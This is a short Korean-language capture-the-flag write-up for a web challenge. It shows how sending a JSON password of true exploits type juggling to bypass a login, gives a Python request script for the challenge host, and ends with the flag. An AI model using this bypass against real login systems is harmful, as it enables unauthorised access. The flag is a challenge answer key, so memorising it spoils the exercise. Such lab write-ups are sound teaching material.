# [hackburger] Enter password to get candy - Writeup

패스워드를 입력할 수 있는 웹페이지가 있다.

___

## Type Juggling

```
data={"password":"1234"}
```

JavaScript에서 Json으로 인코딩하여 패스워드를 전송한다는걸 알아냈다.

그래서 값을 true로 해서 전송하니까 Type Juggling이 발생해서 로그인이 성공했는지 flag를 준다.

``` python
import urllib.parse, urllib.request

def main():
	url = 'http://burger.laboratorium.ee:8003/'
	post_data = {
		'data':'{"password":true}'
	}
	headers = {
		'Content-Type':'application/x-www-form-urlencoded'
	}
	req = urllib.request.Request(url, urllib.parse.urlencode(post_data).encode(), headers)
	res = urllib.request.urlopen(req).read().decode()

	print(res)

if __name__ == '__main__':
	main()
```

___

## Answer

flag: `eae482e1c2d9147891174ecd38bb95a7ee2a9a70`